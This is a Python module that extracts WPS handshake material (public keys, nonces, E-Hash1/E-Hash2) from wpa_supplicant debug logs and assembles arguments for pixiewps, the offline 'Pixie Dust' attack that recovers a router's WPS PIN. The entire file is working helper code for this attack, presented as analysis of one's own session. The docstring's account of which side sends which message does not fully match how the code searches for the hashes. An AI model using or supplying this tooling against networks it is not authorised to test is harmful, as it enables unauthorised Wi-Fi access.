"""pixie.py - harvest WPS M1/M2/M3 material from OUR OWN debug session and
build pixiewps arguments. No monitor mode needed: as a legitimate WPS
participant we observe M1 (ours), M2+M3 (registrar's) directly.

Two log flavors supported:
- wpa_supplicant -dd : `WPS: <Name> - hexdump(len=N): <hex>` attribute lines
- wpa_supplicant -ddd: full EAPOL hexdumps, reassembled + TLV-decoded
"""
import re

# WSC attribute types (subset needed for pixie)
T_ENONCE = 0x101A
T_RNONCE = 0x1039
T_PUBKEY = 0x1032
T_EHASH1 = 0x1014
T_EHASH2 = 0x1015
T_MESSAGE = 0x1022
T_ENCR = 0x1018
T_AUTHENTICATOR = 0x1005
T_EMAC = 0x1020

MESSAGES = {0x04: "M1", 0x05: "M2", 0x06: "M2D", 0x07: "M3", 0x08: "M4",
            0x09: "M5", 0x0A: "M6", 0x0B: "M7", 0x0C: "M8", 0x0F: "Done", 0x10: "NACK"}

NAME2TYPE = {"Enrollee Nonce": T_ENONCE, "Registrar Nonce": T_RNONCE,
             "Public Key": T_PUBKEY, "E-Hash1": T_EHASH1, "E-Hash2": T_EHASH2}


def decode_tlvs(blob):
    """Decode WSC TLV stream. Returns list of (type, value_bytes)."""
    out, i = [], 0
    while i + 4 <= len(blob):
        t = (blob[i] << 8) | blob[i + 1]
        ln = (blob[i + 2] << 8) | blob[i + 3]
        if i + 4 + ln > len(blob):
            break
        out.append((t, bytes(blob[i + 4:i + 4 + ln])))
        i += 4 + ln
    return out


def split_messages(tlvs):
    """Group TLVs by WSC Message attribute. Returns {msg_name: {type: value}}."""
    msgs, cur = {}, None
    for t, v in tlvs:
        if t == T_MESSAGE and len(v) == 1:
            cur = MESSAGES.get(v[0], f"0x{v[0]:02x}")
            msgs[cur] = {}
        elif cur is not None:
            msgs[cur].setdefault(t, v)
    return msgs


def parse_dd_attributes(text):
    """Pull named WPS hexdump lines from a -dd log. Returns {attr_type: hex}."""
    found = {}
    for m in re.finditer(r"WPS:\s+(.+?)\s+-\s+hexdump\(len=\d+\):\s+([0-9a-f ]+)", text):
        name, hx = m.group(1).strip(), re.sub(r"\s+", "", m.group(2))
        t = NAME2TYPE.get(name)
        if t is not None and hx:
            found.setdefault(t, hx)
    return found


_HEXLINE = re.compile(r"^\s*((?:[0-9a-fA-F]{2} ){4,16})")


def reassemble_hexdumps(text):
    """Join wpa_hexdump continuation lines into raw blobs. Returns [bytes]."""
    blobs, cur = [], []
    for line in text.splitlines():
        if "hexdump(len=" in line:
            if cur:
                blobs.append(cur)
            cur = []
            continue
        m = _HEXLINE.match(line)
        if m and cur is not None:
            cur += m.group(1).split()
    if cur:
        blobs.append(cur)
    return [bytes(int(b, 16) for b in blk) for blk in blobs if len(blk) >= 8]


def _find_wsc_payload(blob):
    """Locate WSC content inside an EAP packet: anchor on Message attr TLV."""
    for start in range(len(blob) - 5):
        if blob[start] == 0x10 and blob[start + 1] == 0x22 and blob[start + 2] == 0x00 \
                and blob[start + 3] == 0x01 and blob[start + 4] in MESSAGES:
            return blob[start:]
    return None


def harvest(text):
    """Best-effort extraction. Returns {'M1': {type: hex}, 'M2': ..., 'attrs': {...}}."""
    res = {"attrs": parse_dd_attributes(text)}
    seen = set()
    for blob in reassemble_hexdumps(text):
        payload = _find_wsc_payload(blob)
        if not payload:
            continue
        for msg, tlvs in split_messages(decode_tlvs(payload)).items():
            if msg in seen:
                continue
            seen.add(msg)
            res[msg] = {t: v.hex() for t, v in tlvs.items()}
    return res


def pixie_args(h, essid=""):
    """Build pixiewps CLI args from harvested material (maximal set)."""
    args = []
    m1, m2 = h.get("M1", {}), h.get("M2", {})
    attrs = h.get("attrs", {})
    pke = m1.get(T_PUBKEY) or attrs.get(T_PUBKEY)
    pkr = m2.get(T_PUBKEY)
    eh1 = m2.get(T_EHASH1) or m1.get(T_EHASH1) or attrs.get(T_EHASH1)
    eh2 = m2.get(T_EHASH2) or m1.get(T_EHASH2) or attrs.get(T_EHASH2)
    enonce = m1.get(T_ENONCE) or attrs.get(T_ENONCE)
    rnonce = m2.get(T_RNONCE) or attrs.get(T_RNONCE)
    if pke:
        args += ["--pke", pke]
    if pkr:
        args += ["--pkr", pkr]
    if eh1:
        args += ["--e-hash1", eh1]
    if eh2:
        args += ["--e-hash2", eh2]
    if enonce:
        args += ["--e-nonce", enonce]
    if rnonce:
        args += ["--r-nonce", rnonce]
    if essid:
        args += ["--essid", essid]
    return args


def have_minimum_for_pixie(h):
    """Ralink mode needs at minimum PKE + hashes + enrollee nonce."""
    a = pixie_args(h)
    need = {"--pke", "--e-hash1", "--e-hash2", "--e-nonce"}
    return need.issubset(set(a[::2]))
